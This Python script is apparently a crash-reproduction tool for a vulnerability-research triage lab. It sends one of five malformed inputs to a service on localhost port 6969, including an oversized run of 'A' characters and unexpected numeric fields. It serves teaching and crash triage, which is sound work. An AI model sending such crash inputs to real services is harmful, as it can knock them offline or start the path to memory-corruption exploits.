#!/usr/bin/python3

import socket
import struct
import argparse

class Crasher:
        def __init__(self, host, port):
                self.host = host
                self.port = port
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        def connect(self):
                self.sock.connect((self.host, self.port))
        def crash(self, num):
                if num == 1:
                    message = "3\n144\n0\0"
                elif num == 2:
                    message = "0\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n0\0"
                elif num == 3:
                    message = "AAAAAAAAAAAAAAA\n0\0"
                elif num == 4:
                    message = "4\n0\n0\0"
                elif num == 5:
                    message = "5\n0\n0\0"
                else:
                    print("Invalid crash number")
                    return
                self.send_payload(message)
        def send_payload(self, message):
                self.connect()
                payload = message.encode()
                self.sock.sendall(payload)
        def recv_response(self):
                response = self.sock.recv(1024)
                print("Response: ", response.decode())
        def close(self):
                self.sock.close()

def main():
        parser = argparse.ArgumentParser(description='A crasher for the VR triage lab')
        parser.add_argument('num', type=int, help='Crash number to execute (1-5)')
        args = parser.parse_args()
        client = Crasher("localhost", 6969)
        client.crash(args.num)

if __name__ == "__main__":
        main()
